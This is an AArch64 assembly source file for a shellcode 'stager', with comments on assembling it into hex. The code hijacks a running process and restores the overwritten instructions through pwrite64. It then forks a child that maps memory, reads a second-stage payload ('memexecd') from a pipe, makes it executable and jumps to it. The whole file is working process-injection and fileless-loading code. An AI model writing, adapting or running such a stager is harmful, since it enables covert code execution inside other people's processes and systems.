// A64 stager
// as a.s -o a.o
// objcopy -O binary --only-section=.text a.o a
// xxd -ps a | tr -d '\n' ; echo

.global _start

_start:
	stp x0, x1, [sp, -0x10]!
	stp x2, x3, [sp, -0x10]!
	stp x7, x8, [sp, -0x10]!
	
	adr x7, data

	sub x0, sp, 8
	mov x1, 0
	mov x8, 0x3b // SYS_pipe2
	svc 0

	// x0 and x1 should already be 0
	mov x2, 0
	mov x3, 0
	mov x4, 0
	mov x8, 0xdc // SYS_clone
	svc 0
	cbz x0, load

	ldr w0, [sp, -8] // read end of the pipe
	mov x8, 0x39   // SYS_close
	svc 0

	// Restore the original code at our jmp and return to it
	ldr w0, [x7, data.fd]
	add x1, x7, data.original
	mov x2, 16
	ldr x3, [x7, data.retaddr]
	mov x8, 0x44 // SYS_pwrite64
	svc 0

	ldr w0, [sp, -4]
	ldr w1, [x7, data.fd]
	mov x2, 0
	mov x8, 0x18 // SYS_dup3
	svc 0

	ldr w0, [sp, -4]
	mov x8, 0x39 // SYS_close
	svc 0

	ldr x16, [x7, data.retaddr]

	ldp x7, x8, [sp], 0x10
	ldp x2, x3, [sp], 0x10
	ldp x0, x1, [sp], 0x10

	br  x16

load: // Load memexecd in the child
    mov x0, 0
    mov x1, 0
    mov x8, 0x9a // SYS_setpgid
	svc 0

	ldr  w0, [sp, -4] // write end of the pipe
	mov  x8, 0x39   // SYS_close
	svc 0

	ldr w0, [sp, -8]
	mov w1, 0
	mov x2, 0
	mov x8, 0x18 // SYS_dup3
	svc 0

	ldr w0, [sp, -8]
	mov x8, 0x39   // SYS_close
	svc 0

	ldr w0, [x7, data.fd]
	mov x8, 0x39   // SYS_close
	svc 0

	mov w5, 0
	movn w4, 0
	mov w3, 0x22
	mov w2, 0x3
	mov w1, 0x1000
	mov w0, 0
	mov w8, 0xde // SYS_mmap
	svc 0

	mov w2, w1
	mov x1, x0
	mov w8, 0x3f // SYS_read
	mov w0, 0
	svc 0

	mov x0, x1
	mov x3, x1
	mov w1, w2
	mov w2, 0x5
	mov w8, 0xe2 // SYS_mprotect
	svc 0
	br x3

.align 4
data:

.struct 0
data.retaddr  : .space 8
data.original : .space 16
data.fd       : .space 4
